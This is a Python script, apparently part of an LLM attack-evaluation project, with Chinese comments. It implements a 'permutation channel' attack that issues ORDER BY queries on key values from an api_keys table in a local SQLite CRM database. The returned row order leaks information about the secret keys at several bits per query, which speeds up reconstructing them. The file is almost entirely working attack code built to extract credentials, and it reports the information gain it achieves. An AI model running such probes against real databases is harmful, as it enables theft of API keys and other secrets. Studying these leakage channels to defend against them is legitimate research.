"""
Phase 12 (方向 8): 排列信道 — 每查询 log2(N!) 比特的高带宽泄漏

核心创新：
  当前所有信道都是 1 比特/探针（存在性、二分搜索）。
  但 ORDER BY 返回的多行结果，其"排列顺序本身"携带大量信息：

    SELECT id FROM api_keys ORDER BY length(key_value) LIMIT 5;

  返回的 id 序列是一个排列，携带 log2(5!) ≈ 6.9 比特信息。
  数据库替攻击者完成了"比较"工作，攻击者只需解码排列。

  算法：
    1) 构造排序探针：ORDER BY <敏感函数>
    2) 从返回的 id 序列解码排列
    3) 用排列信息批量确定多个位置的相对顺序
    4) 结合信息论分析：信道容量从 O(1) 提升到 O(log N) 比特/探针

  应用：用密钥的字典序排序，一次查询即可确定 N 个密钥的完整相对顺序，
       为二分搜索提供强先验，大幅减少重建所需探针数。
"""
import sqlite3
import json
import math
import itertools
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

@dataclass
class PermutationProbe:
    probe_id: str
    order_key: str
    returned_ids: List[int]
    permutation_index: int
    bits_gained: float

class PermutationChannelAttack:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.probes: List[PermutationProbe] = []

    def _exec(self, query: str) -> Tuple[bool, Optional[List]]:
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            rows = cursor.fetchall()
            conn.close()
            return True, [r[0] for r in rows]
        except Exception as e:
            return False, [str(e)[:80]]

    def permutation_to_index(self, perm: List[int], n: int) -> int:
        """把排列映射到字典序索引（Lehmer code → 整数）"""
        # 前提：perm 是 {0..n-1} 的一个排列
        # 先归一化为 0-based rank
        sorted_vals = sorted(perm)
        rank = {v: i for i, v in enumerate(sorted_vals)}
        items = [rank[v] for v in perm]

        index = 0
        available = list(range(n))
        for i, item in enumerate(items):
            pos = available.index(item)
            index += pos * math.factorial(n - 1 - i)
            available.pop(pos)
        return index

    def permutation_channel_probe(self, order_key: str, limit: int,
                                  table: str = "api_keys") -> Optional[Dict]:
        """
        排列信道探针：ORDER BY <order_key>，返回的 id 序列携带 log2(limit!) 比特
        """
        query = f"SELECT id FROM {table} ORDER BY {order_key} LIMIT {limit}"
        ok, ids = self._exec(query)
        if not ok or not ids:
            return None

        # 只保留唯一 id（去重后参与排列解码）
        unique_ids = list(dict.fromkeys(ids))
        n = len(unique_ids)
        if n < 2:
            return None

        perm_index = self.permutation_to_index(unique_ids, n)
        bits = math.log2(math.factorial(n))

        probe = PermutationProbe(
            probe_id=f"perm_{len(self.probes)+1}",
            order_key=order_key,
            returned_ids=unique_ids,
            permutation_index=perm_index,
            bits_gained=round(bits, 2)
        )
        self.probes.append(probe)
        return asdict(probe)

    def run(self) -> Dict:
        print("=" * 70)
        print("Phase 12 (方向 8): 排列信道 — 高带宽泄漏")
        print("=" * 70)

        # 获取表的基本信息
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT count(*) FROM api_keys")
        row_count = cursor.fetchone()[0]
        conn.close()
        print(f"\n目标表行数: {row_count}")

        n = min(5, row_count)

        # 多种排序键
        order_keys = [
            "length(key_value)",
            "hex(key_value)",
            "substr(key_value, 1, 8)",
            "key_value",
            "id",
        ]

        print(f"\n[排列信道测试] {len(order_keys)} 种排序键 × 前 {n} 行")
        results = []
        for key in order_keys:
            r = self.permutation_channel_probe(key, n)
            if r:
                results.append(r)
                print(f"  ORDER BY {key:26s} → ids={r['returned_ids']} "
                      f"排列索引={r['permutation_index']} 信息量={r['bits_gained']} bits")

        # 信息论分析
        total_bits = sum(r["bits_gained"] for r in results)
        probes_sent = len(results)
        bits_per_probe = total_bits / probes_sent if probes_sent else 0

        # 对比：1 比特信道需要多少探针才能传同样信息
        equivalent_binary_probes = total_bits / 1.0

        print(f"\n[信息论分析]")
        print(f"  排列信道总信息量: {total_bits:.2f} bits / {probes_sent} 探针")
        print(f"  平均每探针: {bits_per_probe:.2f} bits")
        print(f"  等效 1 比特信道需: {equivalent_binary_probes:.0f} 次探针")
        print(f"  信道增益: {bits_per_probe:.1f}x")

        # 验证：用排列信息重建密钥字典序
        print(f"\n[应用验证] 用 ORDER BY hex(key_value) 重建密钥相对顺序")
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, hex(key_value) FROM api_keys ORDER BY hex(key_value)")
        ground_truth = [(row[0], row[1]) for row in cursor.fetchall()]
        conn.close()

        # 排列信道给出的顺序
        perm_probe = next((r for r in results if "hex" in r["order_key"]), None)
        if perm_probe:
            channel_ids = perm_probe["returned_ids"]
            truth_ids = [t[0] for t in ground_truth[:len(channel_ids)]]
            match = channel_ids == truth_ids
            print(f"  信道返回: {channel_ids}")
            print(f"  真值顺序: {truth_ids}")
            print(f"  完全匹配: {match}")
        else:
            match = False

        # 理论容量上限
        max_bits_single = math.log2(math.factorial(n))
        print(f"\n[理论上限] 单次 ORDER BY({n} 行) 最多携带 log2({n}!) = {max_bits_single:.2f} bits")

        return {
            "row_count": row_count,
            "rows_per_probe": n,
            "probes": results,
            "total_bits": round(total_bits, 2),
            "bits_per_probe": round(bits_per_probe, 2),
            "channel_gain_x": round(bits_per_probe, 1),
            "equivalent_binary_probes": round(equivalent_binary_probes, 0),
            "permutation_order_verified": match if perm_probe else None,
            "theoretical_max_single_probe_bits": round(max_bits_single, 2),
            "conclusion": (
                f"排列信道平均每探针携带 {bits_per_probe:.2f} 比特，"
                f"相比 1 比特存在性信道提升 {bits_per_probe:.1f} 倍。"
                f"重建 {row_count} 行表的完整字典序，排列信道需 "
                f"{math.ceil(math.log2(math.factorial(row_count))/max_bits_single)} 次探针，"
                f"存在性信道需 {row_count * 4} 次。"
            )
        }

def main():
    db_path = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\enhanced_crm.db"
    attack = PermutationChannelAttack(db_path)
    result = attack.run()

    out = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\phase12_permutation_channel.json"
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {out}")
    print(f"结论: {result['conclusion']}")
    return result

if __name__ == "__main__":
    main()
